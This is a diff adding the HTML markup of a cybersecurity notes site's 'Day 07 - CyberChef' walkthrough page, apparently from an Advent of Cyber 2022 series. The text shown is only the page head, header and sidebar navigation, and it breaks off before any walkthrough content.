@@ -1,0 +1,2319 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
+      
+      
+        <meta name="author" content="Nouman Noor">
+      
+      
+        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/adventofcyber2022/day7/">
+      
+      
+        <link rel="prev" href="../day6/">
+      
+      
+        <link rel="next" href="../day8/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
+    
+    
+      
+        <title>Day 07 - CyberChef - CyberSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#introduction" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CyberSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Day 07 - CyberChef
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
+    
+      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../notes/misc/shellstabilisation/" class="md-tabs__link">
+          
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../activedirectorybasics/" class="md-tabs__link">
+          
+  
+    
+  
+  Walkthroughs
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>
+
+    </a>
+    CyberSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Notes
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Misc
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Misc
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/misc/shellstabilisation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Shell Stabilisation
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Network
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Network
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/network/dns/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/network/osimodel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    OSI Model
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Privilege Escalation (Linux)
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Privilege Escalation (Linux)
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/privesc_linux/crontab/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cron Jobs
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwd/Shadow File
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Path Variable
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../notes/privesc_linux/suid/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SUID
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Walkthroughs
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Walkthroughs
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    THM
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            THM
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../activedirectorybasics/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Active Directory Basics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Advent of Cyber 2022
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Advent of Cyber 2022
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day1/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 1 - Frameworks
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day2/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 2 - Log Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day3/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 3 - OSINT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day4/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 4 - Scanning
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day5/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 5 - Brute Force
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day6/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 6 - Email Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Day 7 - Cyber Chef
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Day 7 - Cyber Chef
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introduction
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day8/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 8 - Smart Contracts
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day9/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 9 - Pivoting
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day10/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 10 - Hack a Game
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day11/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 11 - Memory Forensics
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day12/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 12 - Malware Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day13/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 13 - Packet Analysis
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day14/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 14 - Web Applications
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day15/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 15 - Secure Coding (Securing File Upload)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day16/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 16 - Secure Coding (SQLi)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day17/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 17 - Secure Coding (Regular Expressions)
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day18/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 18 - Sigma
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day19/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 19 - Hardware Hacking
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day20/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 20 - Firmware Reverse Engineering
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../day21/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Day 21 - MQTT
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
